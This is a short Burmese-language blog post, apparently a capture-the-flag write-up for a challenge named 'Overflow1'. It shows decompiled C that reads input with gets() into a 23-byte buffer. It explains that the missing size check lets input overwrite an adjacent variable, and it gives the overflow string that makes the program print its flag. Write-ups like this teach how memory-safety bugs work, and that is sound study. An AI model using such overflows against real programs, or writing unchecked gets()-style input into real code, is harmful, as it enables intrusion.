+++
date = '2026-06-04T13:14:01+06:30'
draft = false
title = 'Overflow1'
cover = '/images/covers/bg26.webp'
+++

> overflowme1 ကို ida pro နဲ့ analyse တဲ့အခါမှာ 


```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[23]; // [rsp+0h] [rbp-30h] BYREF
  char v5; // [rsp+17h] [rbp-19h]
  FILE *stream; // [rsp+18h] [rbp-18h]
  char *filename; // [rsp+20h] [rbp-10h]
  int v8; // [rsp+2Ch] [rbp-4h]

  setup(argc, argv, envp);
  banner();
  v8 = 0;
  puts("Please go ahead and leave a comment :");
  gets(v4);
  if ( !v8 )
  {
    puts("Bye bye\n");
    exit(1);
  }
  filename = "flag.txt";
  stream = fopen("flag.txt", "r");
  while ( 1 )
  {
    v5 = fgetc(stream);
    if ( v5 == -1 )
      break;
    putchar(v5);
  }
  fclose(stream);
  return 0;
}
```

ဒီမှာဆိုရင် gets(v4) -> v4 က [23] byte accept ပြီး အဲ့ထက်ကျော်အောင်ရေးလို့ရတယ် size check မပါလို့ အဲ့ကြောင်း buffer overflow ဖြစ်တယ် 

v8 ကို ချိန်းနိုင်လိုက်တာနဲ့ flag ရမယ် အဲ့ဒီတော့ 

> payload = aaaaaaaabaaaaaaacaaaaaaadaaaaaaaabaaaaaaacaaaaaaad
> boom!!! got flag -> [+] gh0st69